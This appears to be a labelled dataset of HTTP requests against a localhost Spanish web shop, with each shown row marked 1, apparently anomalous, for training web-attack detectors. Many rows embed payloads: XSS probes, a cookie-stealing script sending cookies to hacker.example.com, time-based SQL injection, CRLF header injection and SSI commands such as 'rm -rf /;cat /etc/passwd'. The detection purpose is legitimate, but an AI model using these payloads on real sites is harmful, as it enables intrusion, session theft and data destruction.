,request,label
1039,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wendy&password=a-h�lo&nombre=bob@<script>alert(paros)</script>.parosproxy.org&apellidos=alba�il+comasoli&email=raidhi_altermen@prestamosypersonales.kw&dni=68675744k&direccion=puerto+de+canfranc+179,+&ciudad=mont�n&cp=12415&provincia=guadalajara&ntc=8960280484576559&b1=registrar",1
1040,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1041,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=vino+rioja&precio=39&cantidad=93&b1=a�adir+al+carrito,1
1042,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4708&b1=pasar+por+caja/,1
1043,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
1044,gethttp://localhost:8080/events4.nsf,1
1045,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lerch&passworda=5elas2omat�2eo&nombre=alcira&apellidos=forn�s+kohls&email=busch@show.nom.na&dni=71246547e&direccion=francisco+ni�o,+100+&ciudad=marazoleja&cp=19144&provincia=valladolid&ntc=2373775613776198&b1=registrar",1
1046,gethttp://localhost:8080/tienda1/publico/asf-logo-wide,1
1047,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
1048,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=','0','0','0','0');waitfor+delay+'0:0:15';--",1
1049,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=halsy&pwd=engarbado&remembera=off&b1=entrar,1
1050,gethttp://localhost:8080/asf-logo-wide.gif.old,1
1051,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+.*?rioja&precio=100&cantidad=84&b1=a�adir+al+carrito,1
1052,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jada&password=0a3gan861&nombre=asad&apellidos=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&email=seward_sepulvede@promotorareina.bt&dni=05599581r&direccion=cuesta+del+mercadillo,+30+&ciudad=valdemeca&cp=44367&provincia=palencia&ntc=2588788031004045&b1=registrar",1
1053,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=<script>alert(""paros"");</script>",1
1054,puthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9594&b1=pasar+por+caja,1
1055,posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jilann6&password=inna&nombre=hipabia&apellidos=salvatierra+escala&email=sangareau@faders.com.mil&dni=80061275t&direccion=barriada+de+la+doctora+15+&ciudad=agaete&cp=23450&provincia=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&ntc=4825239492507549&b1=registrar,1
1056,gethttp://localhost:8080/tienda1/miembros/index.jsp~,1
1057,posthttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritobob@<script>alert(paros)</script>.parosproxy.org,1
1058,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=vino+.*?rioja&precio=85&cantidad=21&b1=a�adir+al+carrito,1
1059,gethttp://localhost:8080/tienda1/global/titulo.jsp/asf-logo-wide,1
1060,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritosessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
1061,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=queso+manchego&precio=100&cantidad=18&b1a=a�adir+al+carrito,1
1062,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=39&cantidad=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>&b1=a�adir+al+carrito,1
1063,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=3&nombre=queso+manchego&precio=85&cantidad=63&b1=a�adir+al+carrito,1
1064,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modoa=entrar&login=settles8&pwd=1n02r20or&remember=off&b1=entrar,1
1065,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombrea=queso+manchego&precio=85&cantidad=94&b1=a�adir+al+carrito,1
1066,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=calmenso&pwd=1ece57al&remember=off&b1a=entrar,1
1067,"gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=arro&pwd=carminar<!--#include+file=""archivo_secreto""+-->&remember=on&b1=entrar",1
1068,gethttp://localhost:8080/tienda1.inc,1
1069,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertarany%3f%0aset-cookie%3a+tamper%3d5765205567234876235&precio=8789&b1=confirmar,1
1070,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precioa=85&cantidad=21&b1=a�adir+al+carrito,1
1071,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas');waitfor+delay+'0:0:15';--,1
1072,"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3574&b1=','0','0','0','0');waitfor+delay+'0:0:15';--",1
1073,gethttp://localhost:8080/tienda1/index.jsp/.old,1
1074,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
1075,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=allix&password=ramad�n&nombre=yemina&apellidos=sejas+escriba&emaila=roe@prensahp.ge&dni=76844031l&direccion=c/+pintor+pedro+cabanes,+121+11b&ciudad=valle+de+hecho&cp=50783&provincia=le�n&ntc=6147677145944254&b1=registrar",1
1076,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kelli&password=resca�o&nombre=an�car&apellidos=bastus+pellini&email=wiley@pintandomucho.va&dni=65763257r&direccion=c/+cases+noves,+98,+&ciudad=gomesende&cp=41540&provincia=g+uadalajara&ntc=2592750778275929&b1=registrar",1
1077,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jagan&password=fa9lado7a','0','0','0','0');waitfor+delay+'0:0:15';--&nombre=nelma&apellidos=sastre+molt�&email=erbd.matache@elsentidodelavida.vg&dni=16052504e&direccion=juan+manso,+49,+3-h&ciudad=p��ar&cp=17133&provincia=palencia&ntc=0040408141488994&b1=registrar",1
1078,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1<script>alert(""paros"");</script>",1
1079,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=jam�n+ib�rico&precio=39&cantidad=78&b1=a�adir+al+carrito,1
1080,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=jam�n+ib�rico&precio=39&cantidada=50&b1=a�adir+al+carrito,1
1081,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1082,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='injected_param,1
1083,gethttp://localhost:8080/cfide/administrator/welcomestart.cfm,1
1084,gethttp://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide,1
1085,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carritoany%0d%0aset-cookie%3a+tamper%3d5765205567234876235,1
1086,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1087,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombrea=vino+rioja&precio=100&cantidad=34&b1=a�adir+al+carrito,1
1088,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1';waitfor+delay+'0:0:15';--,1
1089,gethttp://localhost:8080/tienda1/publico/6909030637832563290.jsp.inc,1
1090,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=melany9&password=imperturbablemente&nombre=auberto&apellidos=carabelli+larra�aga&email=ansel@barebackespa�a.lv&dni=42519552g&direccion=c/+echeto+38,+&ciudad=biel&cp=22439&provincia=m.adrid&ntc=6099378900535506&b1=registrar",1
1091,gethttp://localhost:8080/iisadmpwd/anot.htr,1
1092,gethttp://localhost:8080/tienda1/6909030637832563290.jsp,1
1093,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar?&precio=9014&b1=confirmar,1
1094,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=vino+rioja&precio=85/&cantidad=26&b1=a�adir+al+carrito,1
1095,gethttp://localhost:8080/smarticketapp/index.html,1
1096,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2a=vaciar+carrito,1
1097,gethttp://localhost:8080/iissamples/sdk/asp/database/simplequery_vbscript.asp,1
1098,gethttp://localhost:8080/tienda1/global/asf-logo-wide,1
1099,"gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1211&b1=""+and+""1""=""1",1
1100,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jenni&password=ps+i8ol�gico&nombre=daisi&apellidos=saavedra+aldeta&email=erbd.matache@elsentidodelavida.vg&dni=53897959n&direccion=travesa+de+teo+155+&ciudad=villan�a&cp=50213&provincia=castell�n','0');waitfor+delay+'0:0:15';--&ntc=5918980753529049&b1=registrar",1
1101,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja""><!--#exec+cmd=""dir+""--><&precio=85&cantidad=90&b1=a�adir+al+carrito",1
1102,"posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=','0','0','0','0');waitfor+delay+'0:0:15';--",1
1103,"gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=','0','0');waitfor+delay+'0:0:15';--",1
1104,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cohen&password=pirr7n108&nombre=siro&apellidos=casaramon+tetatzin&emaila=malcolm_motaung@enlanzarote.com.yu&dni=30635705g&direccion=cristo+rey,+59,+2b&ciudad=arenales+de+san+gregorio&cp=24745&provincia=huelva&ntc=2796424278292099&b1=registrar",1
1105,posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=pattin&password=48h817n7&nombre=tr�nsito&apellidos=camorlinga+aragon�s&email=boehm@zeat.bo&dni=67474361c&direccion=praza*+crucero+de+cani*do*+144+9?g&ciudad=gav�&cp=06413&provincia=toledo&ntc=2637703097461568&b1=registrar,1
1106,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modoa=insertar&precio=4639&b1=confirmar,1
1107,posthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
1108,gethttp://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/,1
1109,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6908&b1=confirmarsessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
1110,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rahn&pwda=28sca5�7&remember=on&b1=entrar,1
1111,gethttp://localhost:8080/4861362529278789730.old,1
1112,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2bob%40%3cscript%3ealert%28paros%29%3c%2fscript%3e.parosproxy.org,1
1113,puthttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,1
1114,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=einersen&password=despagada&nombre=emanuel&apellidos=sarrasec+ar�valo&email=gottowt@enibiza.com.es'injected_param&dni=96118316m&direccion=passatge+del+sol,+0+13?d&ciudad=megeces&cp=42148&provincia=m�laga&ntc=8462242772116416&b1=registrar",1
1115,posthttp://localhost:8080/tienda1/publico/anadir.jsp?ida=1&nombre=queso+manchego&precio=85&cantidad=65&b1=a�adir+al+carrito,1
1116,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=alane&password=9u7je&nombre=ignolinda&apellidos=motta&email=fargue-innis@soycastellano.no&dni=04469375s&direccion=calle+melchor+cobo+medina,+16,+6h&ciudad=andorra&cp=09129&provincia=<!--#exec+cmd=""ls+/""-->&ntc=1134011255413195&b1=registrar",1
1117,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1118,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1119,gethttp://localhost:8080/tienda1/publico/asf-logo-wide.gif/,1
1120,gethttp://localhost:8080/tienda1/global.inc,1
1121,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=darpa8&password=pa7em7&nombre=crispino&apellidos=leon&email=dymon@cursosenlaplaya.lk&dni=70312987d&direccion=calamar,+s/n+10?h&ciudad=.gualchos&cp=26312&provincia=�lava&ntc=2847781311275477&b1=registrar",1
1122,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=leonerd&password=6a6o57a&nombre=christopher&apellidos=silva&email=havoc8@g-audi.eg&dni=56405919y&direccion=c/+miquel+palomares,+73+7?c&ciudad=bidegoian&cp=16415&provincia=almer�a&ntc=222921063999579a&b1=registrar",1
1123,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
1124,"posthttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=antonin&password=suplidora&nombre=any%3f%0aset-cookie%3a+tamper%3d5765205567234876235&apellidos=giorgis+zabala&email=merry@mcrspain.gg&dni=23625046k&direccion=pla�a+manuel+corachan+s/n,+9a&ciudad=coscurita&cp=08696&provincia=lleida&ntc=1573270411029963&b1=registrar",1
1125,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=eamonn&password=673que422&nombre=arador&apellidos=gala+vaquer&emaila=killorin@lodgeinmadrid.gl&dni=38367717z&direccion=grup+de+la+torre+lloveta+145+&ciudad=huerta+de+rey&cp=31133&provincia=huesca&ntc=5414663163826513&b1=registrar,1
1126,gethttp://localhost:8080.old,1
1127,gethttp://localhost:8080/servlet/snoop2,1
1128,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=85&cantidad=32&b1a=a�adir+al+carrito,1
1129,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7651&b1=confirmar/,1
1130,gethttp://localhost:8080/tienda1/global/titulo.jsp.inc,1
1131,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectasparos%22%20style=%22background:url(javascript:alert('paros')),1
1132,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jasver9&pwd=76r9v3t2&remembera=off&b1=entrar,1
1133,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=vaciar+carrito?,1
1134,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectassessionid=12312312&+username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%61%74%74%61%63%6b%65%72%68%6f%73%74%2e%65%78%61%6d%70%6c%65%2f%63%67%69%2d%62%69%6e%2f%63%6f%6f%6b%69%65%73%74%65%61%6c%2e%63%67%69%3f%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3c%2f%73+%63%72%69%70%74%3e?,1
1135,gethttp://localhost:8080/tienda1/publico/anadir.jsp/6909030637832563290.jsp,1
1136,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=stanly&password=fundida&nombre=florencio&apellidos=angl�s+ors&email=macnicol@vilano.cl&dni=94288893w&direccion=c/+murillo,+25+&ciudada=villanueva+de+cameros&cp=03520&provincia=le�n&ntc=2518528858482826&b1=registrar",1
1137,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=nitin&password=r4mitir&nombre=lionel&apellidos=teixidor+modrego&email=creach@vindexexpo.gr&dnia=37118814b&direccion=c/+joaquin+arjona+70,+&ciudad=rionegro+del+puente&cp=49639&provincia=barcelona&ntc=8651464575981410&b1=registrar",1
1138,posthttp://localhost:8080/tienda1/publico/anadir.jsp?id=3/&nombre=vino+rioja&precio=85&cantidad=46&b1=a�adir+al+carrito,1
1139,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=iseno**r&pwd=0axmord�n&remember=off&b1=entrar,1
1140,"gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=winona&password=pic�n&nombre=nayla&apellidos=torre+xu&emaila=hyer_longdon0@artforall.mc&dni=83627503d&direccion=calle+corbina,+100+&ciudad=hornillos+de+cameros&cp=46691&provincia=cuenca&ntc=5175565918974704&b1=registrar",1
1141,posthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=chartran&pwd=sapillo&remember=on/&b1=entrar,1
1142,gethttp://localhost:8080/_vti_cnf/,1
1143,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100/&cantidad=69&b1=a�adir+al+carrito,1
1144,gethttp://localhost:8080/tienda1/global/estilos.css/6909030637832563290.jsp.inc,1
1145,gethttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioa=854&b1=pasar+por+caja,1
1146,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=jessamin&password=entera&nombre=miy�n&apellidos=agundis+depalol&email=bonner@926.dm&dni=22787443d&direccion=probintzietako,+3+10?d&ciudad=sils&cp=47686+&provincia=girona&ntc=7246879991228757&b1=registrar",1
1147,posthttp://localhost:8080/tienda1/publico/entrar.jsp?errormsga=credenciales+incorrectas,1
1148,gethttp://localhost:8080.inc,1
1149,gethttp://localhost:8080/tienda1/publico/vaciar.jsp?b2=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,1
1150,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2%20&nombre=queso+manchego&precio=100&cantidad=58&b1=a�adir+al+carrito,1
1151,gethttp://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg.old,1
1152,gethttp://localhost:8080/wliconsole,1
1153,gethttp://localhost:8080/mail.box,1
1154,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg='injected_param,1
1155,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=matsuzak&password=de82g�gic8&nombre=hayd�e&apellidos=arrotcharen+doniz&email=kontou@15horas.wf&dni=06384093y&direccion=calle+crucero-bouzas,+185,+&ciudad=leaburu&cp=32730&provincia=teruel&ntc=0473794196460600&b1=registrarany%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727%0d%0a",1
1156,"gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=vino+rioja<!--#exec+cmd=""rm+-rf+/;cat+/etc/passwd""+-->&precio=39&cantidad=69&b1=a�adir+al+carrito",1
1157,gethttp://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=queso+manchego&precioa=85&cantidad=69&b1=a�adir+al+carrito,1
1158,"posthttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hofstett&password=furtivo&nombre=bartolomea&apellidos=villal�n&email=horeth@twinjet.al&dni=19895681z&direccion=santa+maria+de+mazzarello+185,+&ciudad=caba�as+de+la+sagra&cp=17770&provincia=tarragona&ntca=4479205024871909&b1=registrar",1
1159,puthttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=azzuolo&pwd=atrabiliario&remember=off&b1=entrar,1
1160,gethttp://localhost:8080/tienda1/publico/registro.jsp?modo=registro&logina=audy&password=8a9c27&nombre=juan&apellidos=ricart+rizzi&email=taube@farmaoferta.bi&dni=94839637b&direccion=calle+san+indalencio+168+&ciudad=san+jos�+del+valle&cp=33783&provincia=zamora&ntc=8868360012752422&b1=registrar,1
1161,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=vasiliad&password=e8cop762r&nombre=gilberto&apellidos=brzozowski&email=ocallaghan_overlander@progr@amagestione@rp.ph&dni=69084830y&direccion=av.+del+cantabrico+121,+2?b&ciudad=bergondo&cp=10135&provincia=lleida&ntc=7240523818698482&b1=registrar",1
1162,gethttp://localhost:8080/tienda1/publico/entrar.jsp?errormsg=credenciales+incorrectas%3cscript%3ealert%28%22paros%22%29%3b%3c%2fscript%3e,1
1163,posthttp://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7578&b1a=confirmar,1
1164,gethttp://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ernie5&pwd=any%3f%0d%0aset-cookie%3a+tamper%3d1041264011025374727&remember=off&b1=entrar,1
1165,"gethttp://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=schenck6&password=veloc�pedo&nombre=rangle&apellidos=santalo+gabas&email=gelman_fildes@qcole.et&dni=20787549b&direccion=lugar+monta�a+del+palmital,+143,+8-e&ciudad=maracena&cp=%7c&provincia=toledo&ntc=1669337364255501&b1=registrar",1
1166,gethttp://localhost:8080/tienda1/publico/caracteristicas.jsp?ida=1,1
